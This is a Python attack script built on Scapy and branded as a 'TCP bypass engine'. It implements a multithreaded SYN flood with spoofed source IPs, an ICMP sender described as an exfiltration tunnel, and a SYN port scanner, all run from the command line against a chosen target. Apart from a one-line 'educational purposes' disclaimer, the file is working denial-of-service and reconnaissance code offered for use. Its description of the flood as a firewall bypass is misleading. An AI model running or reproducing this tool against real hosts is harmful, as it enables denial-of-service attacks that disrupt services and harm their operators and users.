#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import struct
import threading
import argparse
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
from termcolor import cprint

def print_banner():
    """Displays an aesthetic banner with kendrick in pink ASCII art."""
    kendrick_art = """
██╗  ██╗███████╗███╗   ██╗██████╗ ██████╗ ██╗ ██████╗██╗  ██╗
██║ ██╔╝██╔════╝████╗  ██║██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝
█████╔╝ █████╗  ██╔██╗ ██║██║  ██║██████╔╝██║██║     █████╔╝
██╔═██╗ ██╔══╝  ██║╚██╗██║██║  ██║██╔══██╗██║██║     ██╔═██╗
██║  ██╗███████╗██║ ╚████║██████╔╝██║  ██║██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                 [ TCP BYPASS ENGINE ]
    """
    cprint(kendrick_art, 'magenta', attrs=['bold'])
    cprint("Author: Kendrick", 'cyan')
    cprint("Description: Advanced TCP Bypass Script using Scapy", 'yellow')
    cprint("Warning: For educational purposes only. Use responsibly", 'red', attrs=['bold'])
    print("-" * 60)

def random_ip():
    """Generates a random IP address for spoofing."""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def syn_flood(target_ip, target_port, spoof_ip=None, threads=50):
    """
    Performs a SYN flood attack to bypass firewall rules.
    """
    if not spoof_ip:
        spoof_ip = random_ip()

    def send_syn():
        while True:
            try:
                ip_layer = IP(src=spoof_ip, dst=target_ip)
                tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
                packet = ip_layer / tcp_layer
                send(packet, verbose=False)
            except KeyboardInterrupt:
                cprint("\n[!] SYN Flood stopped by user.", 'red')
                sys.exit(1)
            except Exception as e:
                cprint(f"[!] Error: {e}", 'red')

    cprint(f"[*] Starting SYN flood on {target_ip}:{target_port} from {spoof_ip}", 'green')
    for _ in range(threads):
        thread = threading.Thread(target=send_syn)
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint("\n[!] SYN Flood stopped by user.", 'red')
        sys.exit(1)

def icmp_tunnel(target_ip, data="PING"):
    """
    Creates a simple ICMP tunnel for data exfiltration.
    """
    cprint(f"[*] Starting ICMP tunnel to {target_ip}", 'green')
    while True:
        try:
            packet = IP(dst=target_ip) / ICMP() / Raw(load=data)
            send(packet, verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            cprint("\n[!] ICMP tunnel stopped by user.", 'red')
            sys.exit(1)
        except Exception as e:
            cprint(f"[!] Error: {e}", 'red')

def port_scan(target_ip, ports):
    """
    Scans open ports on the target using SYN packets.
    """
    cprint(f"[*] Scanning {target_ip} for open ports...", 'green')
    open_ports = []
    for port in ports:
        try:
            response = sr1(IP(dst=target_ip) / TCP(dport=port, flags="S"), timeout=1, verbose=False)
            if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
                open_ports.append(port)
                cprint(f"[+] Port {port} is open", 'cyan')
        except Exception as e:
            cprint(f"[!] Error scanning port {port}: {e}", 'red')
    cprint(f"[*] Scan complete. Open ports: {open_ports}", 'yellow')
    return open_ports

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Advanced TCP Bypass Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="Target port for SYN flood")
    parser.add_argument("-s", "--spoof", help="Spoof IP address")
    parser.add_argument("--syn-flood", action="store_true", help="Perform SYN flood attack")
    parser.add_argument("--icmp-tunnel", action="store_true", help="Create ICMP tunnel")
    parser.add_argument("--port-scan", action="store_true", help="Scan for open ports")
    args = parser.parse_args()

    if args.syn_flood:
        if not args.port:
            cprint("[!] Error: --port is required for SYN flood.", 'red')
            sys.exit(1)
        syn_flood(args.target, args.port, args.spoof)
    elif args.icmp_tunnel:
        icmp_tunnel(args.target)
    elif args.port_scan:
        ports = range(1, 1025)
        port_scan(args.target, ports)
    else:
        cprint("[!] No action specified. Use --syn-flood, --icmp-tunnel, or --port-scan.", 'red')
        sys.exit(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        cprint("[!] This script requires root privileges to run.", 'red')
        sys.exit(1)
    main()
